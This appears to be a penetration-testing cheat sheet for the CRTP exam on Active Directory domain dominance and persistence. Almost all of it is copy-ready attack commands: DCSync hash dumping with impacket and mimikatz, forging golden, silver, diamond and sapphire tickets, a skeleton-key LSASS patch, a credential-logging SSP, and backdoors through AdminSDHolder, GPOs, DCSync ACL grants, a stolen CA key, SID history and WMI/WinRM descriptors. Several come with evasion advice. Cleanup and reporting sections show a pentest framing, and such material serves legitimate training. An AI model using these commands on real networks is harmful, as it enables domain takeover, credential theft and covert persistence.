# AD - Domain Dominance & Persistence

## Table of Contents
- [DCSync](#dcsync)
- [Golden Ticket](#golden-ticket)
- [Silver Ticket](#silver-ticket)
- [Diamond Ticket](#diamond-ticket)
- [Sapphire Ticket](#sapphire-ticket)
- [Trust Ticket](#trust-ticket)
- [Skeleton Key](#skeleton-key)
- [Custom SSP Persistence](#custom-ssp-persistence)
- [DSRM Abuse](#dsrm-abuse)
- [AdminSDHolder](#adminsdholder)
- [GPO Abuse for Persistence](#gpo-abuse-for-persistence)
- [ACL-Based Persistence (WriteDACL / DCSync grant)](#acl-based-persistence-writedacl--dcsync-grant)
- [Golden gMSA](#golden-gmsa)
- [Certificate Persistence (Golden Certificate)](#certificate-persistence-golden-certificate)
- [Machine Account Persistence](#machine-account-persistence)
- [SID History Injection](#sid-history-injection)
- [Operator Checklist](#operator-checklist)
- [Cleanup / Handover](#cleanup--handover)

For roasting, delegation, and PKINIT see [kerberos.md](kerberos.md). For cross-forest / trust tickets see [trusts.md](trusts.md). For getting to DA in the first place see [lateral-movement.md](lateral-movement.md).

---

## DCSync
Impersonate a DC and pull secrets via the **Directory Replication Service** (`DRSUAPI` `DRSGetNCChanges`). Requires an account with **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All** (and `-In-Filtered-Set` for RODC-filtered attrs) on the domain object. Domain Admins / Enterprise Admins / DCs have this by default.

```bash
# impacket - dump one user or everything
secretsdump.py domain.local/dcsyncuser:'Password1'@dc.domain.local -just-dc-user krbtgt
secretsdump.py domain.local/dcsyncuser:'Password1'@dc.domain.local -just-dc          # all domain hashes
secretsdump.py -hashes :<NThash> domain.local/user@dc.domain.local -just-dc-ntlm
secretsdump.py domain.local/user@dc.domain.local -k -no-pass -just-dc                # Kerberos
```
```bash
nxc smb dc.domain.local -u user -p 'Password1' --ntds            # via netexec (uses drsuapi or vss)
nxc smb dc.domain.local -u user -p 'Password1' --ntds --user krbtgt
```
```
:: Windows - mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator /all
```
Grab: `krbtgt` hash (Golden), target service hashes (Silver), machine `$` keys, and AES keys (`-just-dc` outputs them). Save the **domain SID** — you need it for ticket forging: `nxc smb dc -u u -p p | grep SID` or `Get-DomainSID`.

## Golden Ticket
Forge a TGT signed with the **krbtgt** hash. Grants arbitrary user/groups domain-wide until krbtgt is rotated **twice**. Material: krbtgt NT hash (or AES key) + domain SID + domain FQDN.

```bash
# impacket ticketer -> .ccache
ticketer.py -nthash <krbtgt_NT> -domain-sid S-1-5-21-... -domain domain.local Administrator
ticketer.py -aesKey <krbtgt_AES256> -domain-sid S-1-5-21-... -domain domain.local -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass dc.domain.local
```
```
:: Windows - mimikatz / Rubeus
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<krbtgt_NT> /ptt
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /aes256:<krbtgt_AES256> /id:500 /ptt
Rubeus.exe golden /rc4:<krbtgt_NT> /domain:domain.local /sid:S-1-5-21-... /user:Administrator /ptt
```
Prefer `/aes256` — RC4 golden tickets stand out where AES is the norm. Avoid absurd group SIDs; default 512/513/518/519/520 mirrors a real DA.

## Silver Ticket
Forge a **TGS** for one SPN, signed with that **service account's** hash (machine account `$` for CIFS/HOST, or the service user for MSSQL/HTTP). Offline, never touches the DC — no krbtgt needed. Material: service account NT/AES + domain SID + target SPN.

```bash
ticketer.py -nthash <machine$_NT> -domain-sid S-1-5-21-... -domain domain.local \
  -spn cifs/srv01.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass srv01.domain.local
```
```
:: mimikatz - service=cifs gives file access; host+rpcss for wmi; http for winrm
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... \
  /target:srv01.domain.local /service:cifs /rc4:<machine$_NT> /ptt
Rubeus.exe silver /service:cifs/srv01.domain.local /rc4:<machine$_NT> /sid:S-1-5-21-... /user:Administrator /ptt
```
Service-to-access map: `cifs`=SMB, `host`+`rpcss`=WMI/DCOM, `http`=WinRM/PS-Remoting, `mssqlsvc`=SQL, `ldap`=DCSync-via-DC-account. Set `/domain` correctly; PAC not validated by most services -> forged groups accepted.

## Diamond Ticket
Request a **real** TGT then decrypt/modify its PAC (add groups) and re-encrypt with krbtgt. Looks legitimate (real TGT with valid encryption times) — evades detections that flag forged (golden) tickets. Needs krbtgt AES key.

```
Rubeus.exe diamond /krbkey:<krbtgt_AES256> /user:lowpriv /password:Password1 \
  /domain:domain.local /dc:dc.domain.local /enctype:aes /ticketuser:Administrator \
  /groups:512 /ptt
```
```bash
# impacket ticketer supports diamond-style with an existing request
ticketer.py -request -user lowpriv -password 'Password1' -domain domain.local \
  -aesKey <krbtgt_AES256> -domain-sid S-1-5-21-... -user-id 500 -groups 512 Administrator
```

## Sapphire Ticket
Like diamond, but obtain a **legitimate PAC of a privileged user** via S4U2self + U2U, then stuff it into a forged ticket — the PAC content is genuine (correct SIDs/claims), maximally evasive. Needs krbtgt AES key + a controlled account.

```bash
ticketer.py -request -impersonate Administrator -domain domain.local \
  -user lowpriv -password 'Password1' -aesKey <krbtgt_AES256> \
  -domain-sid S-1-5-21-... Administrator
```

## Trust Ticket
Forge an **inter-realm TGT** with the trust key to move across a trust. Covered in depth in [trusts.md](trusts.md). Material: trust key (NT/AES of the `TDO` / trust account) + both domain SIDs.

```
kerberos::golden /user:Administrator /domain:child.domain.local /sid:<child_SID> \
  /sids:<parent_SID>-519 /rc4:<trust_key> /service:krbtgt /target:domain.local /ptt
```

## Skeleton Key
Patch LSASS on the DC so **every** account also accepts a master password (`mimikatz` default) alongside its real one. In-memory only — dies on reboot. Needs DA + DC access. Noisy/risky; lab use.

```
:: on the DC
privilege::debug
misc::skeleton
:: now auth anywhere as any user with password "mimikatz"
```
```bash
sekurlsa::pth /user:anyuser /domain:domain.local /ntlm:60ba4fcadc466c7a033c178194c03df6   # NT of "mimikatz"
```

## Custom SSP Persistence
CRTP persistence topic. Register a malicious **Security Support Provider** so LSASS loads it and logs the **plaintext credentials of every account that authenticates** to the host — capture-at-auth that survives password changes. Best on a DC (every domain logon flows through it). Needs local admin / SYSTEM once.

Two ways to plant `mimilib.dll` (Mimikatz's logging SSP):
```cmd
:: 1) Disk + registry (persists across reboot). Drop mimilib.dll in System32, add it to the SSP list.
copy mimilib.dll C:\Windows\System32\
:: append "mimilib" to the multi-string value (keep the existing packages!)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ ^
  /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
:: (Wdigest\UseLogonCredential=1 also forces plaintext caching, related but separate.)
```
LSASS loads the new SSP at next reboot; captured logons are written to `C:\Windows\System32\kiwissp.log`.
```
:: 2) In-memory only, no disk/reg, no reboot - dies on restart (use for a live session)
mimikatz # privilege::debug
mimikatz # misc::memssp
:: plaintext logons logged to C:\Windows\System32\mimilsa.log
```
Stability/detection: editing `Security Packages` with a bad/mismatched-bitness DLL can **fail LSASS to boot** — verify the DLL matches the OS architecture and preserve the original package list. Reboot required for the on-disk method; `memssp` needs no reboot but is volatile. Loud: new DLL loaded by lsass.exe, `Security Packages` registry write (Event 4657), and the plaintext `.log` file on disk are all high-signal. Cleanup: remove `mimilib` from the value, delete the DLL and log; `memssp` clears on reboot.

## DSRM Abuse
The DC's local **Directory Services Restore Mode** administrator is a SAM account whose hash persists. Set the logon behavior reg key to allow it over the network -> stealthy local-admin-on-DC backdoor. Needs DA once.

```
:: dump DSRM hash on DC
lsadump::sam
:: enable network logon for DSRM account
```
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```
```bash
# then PtH as the DC's local Administrator (SAM) with --local-auth
nxc smb dc.domain.local -u Administrator -H <dsrm_NT> --local-auth
```

## AdminSDHolder
`CN=AdminSDHolder` is the ACL template SDPROP copies to protected groups every ~60 min. Add yourself with **GenericAll** here -> self-heals your rights onto Domain Admins etc. even if removed. Needs write on AdminSDHolder (i.e. DA).

```powershell
# PowerView - grant GenericAll to a controlled user on the template
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' `
  -PrincipalIdentity backdoor -Rights All
# force propagation (or wait for SDPROP)
Invoke-ADSDPropagation      # or set-domainobject Runtime; typically just wait 60 min
```
Verify it landed: `Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? {$_.SecurityIdentifier -match (Get-DomainUser backdoor).objectsid}`.

## GPO Abuse for Persistence
Edit a GPO linked to targets (or link a new one) to run a scheduled task / immediate task as SYSTEM on every host in scope. Needs write on a GPO / `gPLink` on an OU.

```bash
# Linux - pyGPOAbuse creates an immediate scheduled task in an existing GPO
pygpoabuse.py domain.local/user -hashes :<NThash> -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -command 'net user backdoor P@ss123! /add && net localgroup administrators backdoor /add'
```
```powershell
# Windows - SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin \
  --Command "cmd.exe" --Arguments "/c net user ..." --GPOName "Default Domain Policy"
gpupdate /force    # on target, or wait for refresh
```

## ACL-Based Persistence (WriteDACL / DCSync grant)
With **WriteDACL** on the domain object, grant a low-priv principal the two replication rights -> that account can DCSync forever without group membership. Stealthier than adding to DA.

```powershell
# PowerView - grant DCSync rights to a controlled user
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity backdoor -Rights DCSync
```
```bash
# Linux - impacket dacledit
dacledit.py -action write -rights DCSync -principal backdoor \
  -target-dn 'DC=domain,DC=local' domain.local/user:'Password1'
# then any time:
secretsdump.py domain.local/backdoor:'Password1'@dc.domain.local -just-dc
```
Other durable ACL grants: `WriteDACL`/`Owns` on a group, `ForceChangePassword` / `GenericAll` on a user, `AddKeyCredentialLink` (shadow creds) on a computer.

## Golden gMSA
Compute a **gMSA** managed password offline from the KDS root key -> predict/persist the service account password across every rotation. Material: KDS root key (readable by DA/DC) + the gMSA's SID + object attributes.

```bash
# gMSADumper (online read of msDS-ManagedPassword if you have rights)
python3 gMSADumper.py -u user -p 'Password1' -d domain.local
```
```
:: GoldenGMSA (offline compute from KDS root key)
GoldenGMSA.exe kdsinfo                          # enumerate KDS root keys
GoldenGMSA.exe gmsainfo                          # list gMSAs + SIDs
GoldenGMSA.exe compute --sid <gMSA_SID> --kdskey <base64_kds_root_key>
```

## Certificate Persistence (Golden Certificate)
Steal the **CA private key** (`.pfx` from the CA host, DPAPI-protected) and forge client-auth certificates for any principal. Certs remain valid until the CA cert expires — survives password resets. Needs admin on the CA server once.

```
:: extract CA cert+key on the CA (DA/local admin on CA)
certutil -store My               # find CA cert
:: mimikatz - export non-exportable CA key
crypto::capi
crypto::cng
crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export
```
```bash
# forge a cert for any user with the CA key (ForgeCert / certipy)
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -out admin_forged.pfx
# authenticate with it (PKINIT) to get a TGT + NT hash
certipy auth -pfx admin_forged.pfx -dc-ip 10.10.10.10
```
See ADCS ESC techniques in [kerberos.md](kerberos.md)/adcs notes; this is the "Golden Certificate" (DPERSIST1) forgery.

## Machine Account Persistence
A domain-joined computer account (`$`) can be a stealthy backdoor: its hash rarely rotates if you disable auto-rotation, and DC machine accounts can DCSync. Also: create/keep an owned computer (RBCD, shadow creds).

```bash
# create a computer account (default MachineAccountQuota=10)
addcomputer.py domain.local/user:'Password1' -computer-name 'EVIL$' -computer-pass 'Machine123!'
# disable password rotation on an owned machine (persistence)
```
```powershell
# Windows - set on target machine to stop auto-rotation
Set-ItemProperty "HKLM:\System\CurrentControlSet\Services\Netlogon\Parameters" -Name DisablePasswordChange -Value 1
```
DC machine accounts have DCSync rights -> a Silver ticket for `ldap/dc` as the DC's own account can replicate.

## SID History Injection
Add a privileged SID to a controlled account's **sIDHistory** -> the token carries those group memberships without visible group membership. Requires DA / DCSync-level access; enforced only across domains normally (see trusts).

```bash
# impacket - inject via DCShadow-style or ticket. In-forest, easiest is a golden ticket with /sids:
ticketer.py -nthash <krbtgt_NT> -domain-sid <child_SID> -domain child.domain.local \
  -extra-sid <parent_SID>-519 Administrator
```
```
:: mimikatz - write sIDHistory directly (needs DA + patched DC or DCShadow)
sid::patch
sid::add /sam:backdoor /new:S-1-5-21-...-519
:: or via golden ticket extra SIDs
kerberos::golden /user:Administrator /domain:child.local /sid:<child_SID> \
  /sids:<parent_SID>-519 /krbtgt:<krbtgt_NT> /ptt
```

---

## Operator Checklist
Before claiming domain compromise, verify:
- [ ] You can DCSync `krbtgt` (or already dumped NTDS) — proves replication-level control.
- [ ] Confirmed **domain SID** and **krbtgt hash + AES keys** are recorded.
- [ ] Interactive command execution on a DC as SYSTEM/DA (psexec/wmiexec to the DC succeeds).
- [ ] Enumerated **all** domains in the forest and their trusts (root vs child) — DA of a child != EA of the forest. Escalate child->parent if needed ([trusts.md](trusts.md)).
- [ ] Identified whether this is the forest root; Enterprise Admins live there.
- [ ] Confirmed the compromise with a repeatable, low-noise method (ACL DCSync grant) rather than only a golden ticket.
- [ ] Screenshot / log timestamps for the report; note the exact account and method used.

## Cleanup / Handover
For engagements, document and reverse artifacts:
- **Golden/Silver/Diamond tickets** live in memory/ccache only — purge (`kerberos::purge`, `klist purge`, delete `.ccache`). If krbtgt was exposed, recommend **double** krbtgt reset.
- **Created objects:** delete backdoor users, computer accounts (`EVIL$`), scheduled tasks, services, GPO immediate-tasks.
- **ACL changes:** remove added ACEs on the domain object, AdminSDHolder, groups (`dacledit.py -action remove ...`). List every SID you granted rights to.
- **Skeleton Key / DSRM / DisablePasswordChange:** revert reg keys; note DC reboot clears skeleton key.
- **Certificate forgery:** flag that stolen CA keys require CA re-issuance — cannot be "cleaned", must be reported for remediation.
- Provide the client an inventory: every persistence mechanism planted, where, and how to remove it.

## Security-descriptor backdoors for stealthy non-admin remote access (WMI namespace, WinRM/PSRemoting, remote registry)

**Trigger:** You have local admin / SYSTEM on a DC or server once, want durable remote access that does NOT rely on group membership, forged tickets, or a dropped binary, and want it to survive password resets and to blend in as ordinary WMI/WinRM traffic from a low-privileged account.

Instead of adding a user to a privileged group (loud, monitored), rewrite the security descriptors of the remote-access subsystems so one chosen low-priv principal is authorized. Three independent surfaces: (1) WMI namespace ACL — edit the DACL on the __SystemSecurity of root/cimv2 (and root/subscription) so your user gets Remote Enable + Execute, enabling remote WMI queries/exec as a non-admin. (2) PSRemoting/WinRM — modify the RootSDDL of the Microsoft.PowerShell session configuration (or the WSMan Service RootSDDL) to grant your SID access, letting the user Enter-PSSession/Invoke-Command without being in Remote Management Users. (3) Remote registry — add a grant on the winreg key and on the SAM/SECURITY hive DACLs so the user can remotely read hashes (feeds secretsdump-style dumping) without admin. Empire/Nishang RACE.ps1 packages all three as Set-RemoteWMI, Set-RemotePSRemoting, and Add-RemoteRegBackdoor (each takes -SamAccountName and runs remotely against -ComputerName). Because these are ACL edits on OS security descriptors rather than new objects or tickets, they persist across reboots and credential changes and are far quieter than group membership. Cleanup: revert each modified SDDL/DACL to its original value — record the before-state first.

```powershell
# Nishang/Empire RACE.ps1 (run from a session that is admin on the target once)
Import-Module .\RACE.ps1
# 1. WMI namespace backdoor -> remote WMI query/exec as a normal user
Set-RemoteWMI -SamAccountName lowpriv -ComputerName dc.corp.local -namespace 'root\cimv2' -Verbose
# 2. PSRemoting/WinRM RootSDDL backdoor -> Enter-PSSession as a normal user
Set-RemotePSRemoting -SamAccountName lowpriv -ComputerName dc.corp.local -Verbose
# 3. Remote registry + SAM/SECURITY hive DACL -> remote hash read as a normal user
Add-RemoteRegBackdoor -ComputerName dc.corp.local -Trustee lowpriv -Verbose
# use it later from the low-priv account:
Get-WmiObject -Class win32_operatingsystem -ComputerName dc.corp.local -Credential lowpriv
Enter-PSSession -ComputerName dc.corp.local -Credential lowpriv
# cleanup: pass -Remove to each cmdlet (or restore the saved original SDDL)
```

Source: https://offsecexams.com/cheatsheets/crtp-exam---guided-by-redblock

